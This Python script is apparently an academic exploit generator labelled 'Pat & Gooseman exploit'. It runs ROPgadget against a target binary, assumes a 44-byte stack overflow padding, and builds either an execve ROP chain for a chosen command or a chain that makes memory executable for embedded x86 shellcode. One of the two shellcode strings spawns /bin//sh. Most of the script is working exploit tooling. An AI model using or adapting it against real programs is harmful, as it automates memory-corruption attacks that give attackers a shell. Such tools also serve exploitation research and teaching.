import argparse
import subprocess
from io import StringIO
from ParseChain import *
from GadgetFinder import *
from ExecveBuilder import *
from MprotectBuilder import *
from ShellcodeCompiler import *

import gdb


def main():
    parser = argparse.ArgumentParser(description='Pat & Gooseman exploit')
    parser.add_argument('binary', metavar='B', type=str, nargs='+',
                    help='binary')
    parser.add_argument('-c', help='command to execute')

    args = parser.parse_args()

    binary = args.binary[0]

    buffer = 44 #gdb.get_padding_gdb(binary)
    #print("Found padding length of " + str(buffer))

    sc_mode = True

    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    shellcode = b"\x6a\x19\x58\x99\x52\x89\xe3\xcd\x80\x40\xcd\x80"
    sc = ShellcodeCompiler(shellcode)
    sc.setup()

    eb = ExecveBuilder(['eax', 'ebx', 'ecx', 'edx']) if not sc_mode else sc.execve_builder
    command_rg = ["python3", "./ROPgadget/ROPgadget.py", "--binary", args.binary[0], "--ropchain"]

    if not sc_mode or (sc_mode and sc.req_stack):
        with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
            output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
            eb.find_xor_src(output_stream)

        with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
            output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
            eb.find_mov_dst(output_stream)

    if sc_mode:
        sc.execve_builder = eb
        with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
            output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
            sc.start(output_stream)

    else:
        with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
            output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
            eb.build_chain(output_stream, args.c.split(' ')[0], args.c.split(' ')[1:], buffer)
            #eb.build_chain(output_stream, shellcode, buffer)

        eb.write_chain()

        gadgets = eb.gadget_finder.gadgets
        for k, v in gadgets.items():
            print(k + " :: " + str(hex(v.address)) + ", " + str(v.complexity )+ ", " + str(v.side_pops))

        print("DATA " + str(hex(eb.gadget_finder.data)))


main()